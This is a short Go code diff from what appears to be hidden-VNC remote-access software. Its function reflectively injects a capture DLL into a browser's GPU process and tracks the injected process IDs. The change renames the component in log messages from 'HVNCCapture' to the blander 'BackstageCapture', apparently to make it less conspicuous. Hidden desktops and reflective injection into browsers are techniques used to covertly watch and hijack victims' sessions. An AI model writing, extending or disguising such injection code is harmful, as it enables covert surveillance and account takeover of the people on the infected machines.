@@ -947,7 +947,7 @@ func hvncDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
 		}
 
 		if err := reflectiveInject(hProcess, captureDllBytes); err != nil {
-			log.Printf("hvnc inject: HVNCCapture DLL injection into GPU PID %d failed: %v", gpuPID, err)
+			log.Printf("hvnc inject: BackstageCapture DLL injection into GPU PID %d failed: %v", gpuPID, err)
 			procCloseHandle.Call(hProcess)
 			if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
 				fn(false, gpuPID, fmt.Sprintf("DXGI injection failed for GPU PID %d", gpuPID))
@@ -956,7 +956,7 @@ func hvncDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
 		}
 		procCloseHandle.Call(hProcess)
 
-		log.Printf("hvnc inject: HVNCCapture DLL injected into GPU PID %d", gpuPID)
+		log.Printf("hvnc inject: BackstageCapture DLL injected into GPU PID %d", gpuPID)
 		hvncRegisterInjectedPID(gpuPID)
 		hvncRegisterGPUPID(browserPID, gpuPID)
 		if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
